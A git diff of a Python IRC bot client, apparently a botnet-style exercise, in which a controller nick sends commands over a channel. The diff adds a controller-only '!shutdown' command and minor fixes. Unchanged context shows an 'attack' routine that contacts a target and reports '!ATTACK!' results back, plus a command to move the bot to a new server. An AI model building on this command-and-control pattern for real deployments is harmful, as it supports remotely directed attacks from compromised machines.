@@ -3,6 +3,8 @@ import time
 import random
 import string
 import sys
+import signal
+import os
 
 #HOST = ""              # the Twitch IRC server
 #PORT = 1234                         # always use port 6667!
@@ -60,7 +62,7 @@ class clientBot(object):
             sock.send("{} {}\r\n".format(self.counter,self.NICK).encode("utf-8"))
             sock.close()
             self.counter = self.counter + 1
-            self.s.send("PRIVMSG {} : !ATTACK! attack was successfull\r\n".format(self.controller).encode("utf-8"))
+            self.s.send("PRIVMSG {} : !ATTACK! attack was successful\r\n".format(self.controller).encode("utf-8"))
         except Exception as e:
             self.s.send("PRIVMSG {} : !ATTACK! attack was unsucccessful\r\n".format(self.controller).encode("utf-8"))
             
@@ -156,6 +158,16 @@ def connection():
                             newChan = args[1].split()[3].strip()
                             print("line 148: " + newChan)
                             cBot.move(newHost,newPort,newChan)
+                    if args[0] == cBot.chan and args[1].split()[0] == "!shutdown":
+                        if(cBot.gameOn and (cBot.parseController(prefix) == cBot.controller)):
+                            cBot.s.send("PRIVMSG {} : {} {}\r\n".format(cBot.controller, "!SHUTDOWN!", "shutdown i'm out").encode("utf-8"))
+                            #cBot.s.send("QUIT : {}\r\n".format("pz im out"))
+                            #cBot.s.send(signal.SIGINT)
+                            #cBot.s.send(signal.SIGINT)
+                            #cBot.s.send("KILL {} : {}".format(cBot.NICK,"because").encode("utf-8"))
+                            cBot.s.send('\x03'.encode("utf-8"))
+                            sys.exit(signal.SIGTERM)
+                        
             elif command == "KICK" :
                 cBot.connectIRC(cBot.s,cBot.NICK, cBot.chan)                              
             elif command == "PING":
@@ -166,6 +178,7 @@ def connection():
                 cBot.createNick(NICK)
                 cBot.connectIRC(cBot.s,cBot.NICK, cBot.chan)        
     except Exception as e:
+        print(e)
         print("Reconnecting in 5 seconds ...")
         time.sleep(5)
         connection()         
